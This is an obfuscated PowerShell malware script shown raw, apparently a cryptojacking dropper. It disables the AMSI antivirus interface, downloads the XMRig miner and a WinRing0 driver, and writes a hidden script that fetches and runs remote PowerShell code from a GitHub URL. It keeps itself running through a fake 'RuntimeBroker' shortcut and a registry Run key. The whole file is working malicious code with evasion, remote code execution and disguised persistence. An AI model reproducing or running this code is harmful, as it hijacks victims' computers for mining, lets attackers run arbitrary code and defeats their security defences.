${W} = ('System.'+'Man'+'ag'+'ement.A'+'u'+'toma'+'tion'+'.'+'A');${c} = 'si';${M} = ('U'+'tils')
${as`semB`lY} = [Ref]."a`s`seMBLY".('Ge'+'tTyp'+'e').Invoke(('{0}m{1}{2}' -f ${W},${c},${m}))
${fi`e`ld} = ${As`sE`MBlY}.('G'+'etField').Invoke(('am{0}InitFailed' -f ${C}),('Non'+'P'+'ublic'+',St'+'a'+'tic'))
${fIE`ld}.('SetVa'+'lu'+'e').Invoke(${N`UlL},${tR`Ue})

if (&('Tes'+'t'+'-Path') -Path "$env:APPDATA\Microsoft\2504706.txt") {
    exit
} else {
    ${2504} = "$env:APPDATA\Microsoft\2504706.txt"
    ${u`RL} = ('ht'+'t'+'p'+'s'+'://'+'githu'+'b.c'+'om/'+'x'+'m'+'ri'+'g/xmr'+'ig/rel'+'eas'+'es/d'+'ow'+'nload/v6.21.'+'3/x'+'mrig-6.21.3-m'+'svc-win'+'6'+'4.zip')
    ${bA`sepa`Th} = &('J'+'oin-Pa'+'t'+'h') -Path ${ENV:lOc`A`l`ApPData} -ChildPath ('C'+'TF')
    ${Zi`PP`AtH} = .('Join-P'+'at'+'h') -Path ${bA`Se`P`ATH} -ChildPath ('xmrig-6.21.3-msvc-w'+'i'+'n'+'6'+'4.zip')
    ${Ext`Rac`Tp`ATh} = .('Join-'+'P'+'ath') -Path ${ba`SEpA`Th} -ChildPath ('xm'+'ri'+'g'+'-6.21.3')
    ${DE`S`TINa`TioNP`Ath} = ${BA`sEPA`TH}
    ${X`MrIGPa`TH} = .('Joi'+'n'+'-Path') -Path ${d`esTiN`A`TIOnPa`TH} -ChildPath ('xmrig'+'.exe')
    ${Ba`TCHPA`Th} = .('Joi'+'n-P'+'ath') -Path ${b`A`sep`ATH} -ChildPath ('Runti'+'meBroker.'+'p'+'s'+'1')
    ${SHO`RtC`UTPa`Th} = .('Joi'+'n-P'+'a'+'th') -Path "$env:APPDATA\Microsoft\" -ChildPath ('R'+'un'+'timeB'+'roker'+'.'+'lnk')
    ${u`RI2} = (('QU6http'+'s'+'://ra'+'w.'+'gi'+'t'+'h'+'ub'+'userconte'+'nt.'+'com/so2'+'51/ola'+'que'+'ri'+'da/main/'+'fi'+'le.ps'+'1'+'Q'+'U'+'6')  -cREpLaCE([CHAR]81+[CHAR]85+[CHAR]54),[CHAR]34)
    ${Ba`TCHcon`T`EnT} = ('echo'+' '+'5'+'216612'+' '+'> '+"$2504`n "+'po'+'wershe'+'l'+'l '+'-w'+'i'+'nd'+'owstyle '+'hid'+'den '+'-Com'+'ma'+'nd '+(('8RbIn'+'voke-Expres'+'s'+'io'+'n ')-RePLAcE ([cHar]56+[cHar]82+[cHar]98),[cHar]39)+'('+'Invok'+'e-'+'Rest'+'Method '+'-'+'Uri '+"$uri2)' "+'')

    
    if (-not (&('Test'+'-'+'Pat'+'h') -Path ${BaS`e`paTh})) {
        .('New-It'+'em') -Path ${BaSE`P`ATh} -ItemType ('Di'+'rector'+'y') | .('Out-'+'Nul'+'l')

    } else {

    }

    
    &('In'+'vo'+'ke-We'+'bRequest') -Uri ${U`RL} -OutFile ${zIp`pATH}

    
    &('E'+'xp'+'a'+'nd-Archive') -Path ${ZIPP`A`TH} -DestinationPath ${BAse`p`ATh}

    
    ${sOu`R`CEfiLE} = .('Join-P'+'a'+'th') -Path ${e`Xtrac`TPAth} -ChildPath ('xm'+'rig.ex'+'e')

    
    if (.('Test-P'+'at'+'h') -Path ${sO`UrC`e`FIlE}) {
        
        &('Mo'+'ve-I'+'tem') -Path ${soUR`CE`FiLE} -Destination ${DesTin`AtI`O`N`pA`Th}

    } else {

    }

    
    if (&('Test-'+'Pa'+'th') -Path ${zi`p`patH}) {
        .('Re'+'mov'+'e-Item') -Path ${ZI`pPA`TH} -Force

    } else {
 
    }

    
    if (&('T'+'est-Path') -Path ${E`xtRAc`Tpa`Th}) {
        &('Remove'+'-I'+'t'+'em') -Path ${ExtRa`c`T`PAth} -Recurse -Force
   
    } else {
    
    }

    
    &('In'+'voke-R'+'estMe'+'thod') -Uri ('https://'+'github.com/s'+'o'+'25'+'1/olaquerida/rel'+'eas'+'es/d'+'ownlo'+'ad/1releasa'+'e/co'+'nfig.j'+'son') -OutFile "$basePath\config.json"
    &('In'+'voke-'+'Re'+'stM'+'ethod') -Uri ('htt'+'ps:'+'//github.com/so251/'+'o'+'la'+'querida/r'+'eleases'+'/do'+'wnload/1rel'+'easa'+'e/W'+'inRing0x'+'64.sys') -OutFile "$basePath\WinRing0x64.sys"

    
    &('Ne'+'w-I'+'tem') -Path "$batchPath" -ItemType ('Fi'+'le')
    &('S'+'et-'+'Conte'+'nt') -Path ${BatcHp`A`Th} -Value ${b`A`TcHcO`NTEnt}

    
    function C`REATE-S`hOrtCuT {
        param (
            [string]${TargE`Tpa`Th} = "",
            [string]${sHo`Rt`c`UTPatH},
            [string]${wORKING`DIRe`c`T`ory} = "",
            [string]${a`Rg`U`MEnts} = "",
            [string]${iCoN`l`O`CAtiON} = "",
            [string]${De`S`crip`TiON} = ""
        )

        ${wSH`sHE`Ll} = .('New-O'+'bje'+'ct') -ComObject ('WScript'+'.Sh'+'ell')
        ${Sh`OrtC`Ut} = ${wsh`ShELl}.('Cre'+'a'+'teSh'+'ortc'+'ut').Invoke(${s`HoRt`cutpa`TH})
        ${S`hoRT`C`UT}."taRgetp`A`TH" =  ${TArGE`T`paTh}
        ${shO`Rt`cUt}."Arg`Ume`NTS" = ${ARGU`Men`Ts}
        ${ShoR`T`cut}."WOrkING`dire`c`To`RY" = ${W`oRk`InGdi`REct`O`RY}
        ${sH`OR`Tcut}."icONl`OC`ATiON" = ${IC`ONloc`A`Tion}
        ${SHor`TC`UT}."dEs`CriPt`IOn" = ${d`e`sCr`iptION}
        ${S`H`oRTCUT}."Wi`N`dOWSTyle" = 7  
        ${Sho`R`TCuT}.('S'+'ave').Invoke()
    }

    
    
    ${i`Co`NlOcatIon} = ("$SystemRoot\System32\shell32.dll, "+'0')  
    ${DeS`cri`P`Tion} = ('Run'+'ti'+'me B'+'ro'+'ker')


    .('Cre'+'at'+'e-Shortcut') -TargetPath (('C:YwKWindows'+'YwKS'+'ystem3'+'2'+'YwKWindowsPower'+'ShellY'+'wKv1.'+'0Yw'+'Kpowe'+'rshell.e'+'x'+'e') -crepLaCE  ([CHar]89+[CHar]119+[CHar]75),[CHar]92) -ShortcutPath ${shOrtc`UtP`AtH} -IconLocation ${I`CO`NLOC`AtioN} -Description ${dE`SC`R`IptION} -Arguments ${batC`h`paTH}

    
    .('Se'+'t-Item'+'Propert'+'y') -Path (('H'+'KC'+'U:'+'{0}Software'+'{0'+'}Mic'+'r'+'os'+'of'+'t{0}Windo'+'w'+'s{0}C'+'urre'+'n'+'tV'+'ersio'+'n{0}Run')-f[ChAr]92) -Name ('Runt'+'imeBro'+'ker') -Value "`"$shortcutPath`""

    &('Star'+'t-Pro'+'ce'+'ss') -FilePath "`"$shortcutPath`"" -WindowStyle ('Hidd'+'en')

}
